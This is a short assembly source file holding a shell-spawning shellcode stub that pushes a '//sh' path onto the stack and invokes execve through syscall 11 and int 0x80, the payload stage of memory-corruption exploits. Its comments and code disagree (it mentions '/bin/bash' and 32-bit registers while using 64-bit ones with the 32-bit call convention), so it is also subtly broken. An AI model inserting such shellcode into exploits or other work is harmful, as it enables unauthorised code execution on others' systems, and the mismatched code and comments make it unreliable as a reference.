global _start

section .text
_start:

execve:
    ; int execve(const char *filename, char *const argv [], char *const envp[])
    ;                     ebx                 ecx                edx

    xor rax, rax
    push rax          ; null terminate following string on stack

    ; push ////bin/bash str on stack
    push 0x68732f2f   ; //sh
    push 0x2f6e6962   ; bin/
    push 0x2f2f2f2f   ; ////

    mov rbx, rsp      ; point ebx to beginning of string just pushed

    push rax          ; null terminate following 
    mov rdx, rsp      ; edx points to null on stack 

    push rbx          ; push address os /bin/sh on stack
    mov rcx, rsp      ; point ecx to that address

    mov al, 11        ; Syscall #11
    int 0x80          ; Do it.
